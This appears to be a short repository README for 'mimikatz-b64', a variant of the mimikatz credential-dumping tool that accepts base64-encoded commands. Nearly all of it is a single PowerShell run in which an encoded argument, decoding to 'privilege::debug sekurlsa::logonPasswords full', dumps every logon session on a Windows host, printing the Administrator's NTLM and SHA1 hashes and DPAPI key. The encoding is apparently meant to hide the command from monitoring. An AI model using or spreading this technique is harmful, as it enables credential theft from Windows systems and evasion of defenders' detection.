# mimikatz-b64



对mimikatz进行base64编码



```
PS C:\Users\Administrator\Desktop\mimikatz-b64\x64> .\mimikatz.exe cHJpdmlsZWdlOjpkZWJ1ZyAic2VrdXJsc2E6OmxvZ29uUGFzc3dvcmRzIGZ1bGwiIGV4aXQ=

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 25 2023 10:30:13
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # sekurlsa::logonPasswords full

Authentication Id : 0 ; 778364 (00000000:000be07c)
Session           : Interactive from 1
User Name         : Administrator
Domain            : DESKTOP-C86MRTM
Logon Server      : DESKTOP-C86MRTM
Logon Time        : 2023/9/25 9:53:19
SID               : S-1-5-21-1737634425-762371062-3249969286-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : DESKTOP-C86MRTM
         * NTLM     : d0ea8d6dce9de067a1298cf1f33de205
         * SHA1     : 867185bf53ae026a8bcc0af0f7880f5345b53e64
         * DPAPI    : 867185bf53ae026a8bcc0af0f7880f53
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DESKTOP-C86MRTM
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : DESKTOP-C86MRTM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 115135 (00000000:0001c1bf)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/9/25 9:53:03
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-C86MRTM$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 115087 (00000000:0001c18f)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/9/25 9:53:03
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-C86MRTM$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DESKTOP-C86MRTM$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2023/9/25 9:53:02
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-C86MRTM$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : desktop-c86mrtm$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/9/25 9:53:02
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 78331 (00000000:000131fb)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/9/25 9:53:02
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-C86MRTM$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 78330 (00000000:000131fa)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/9/25 9:53:02
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-C86MRTM$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 76696 (00000000:00012b98)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/9/25 9:53:02
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DESKTOP-C86MRTM$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2023/9/25 9:53:02
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DESKTOP-C86MRTM$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : desktop-c86mrtm$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
        cloudap :

mimikatz(commandline) # exit
Bye!
```

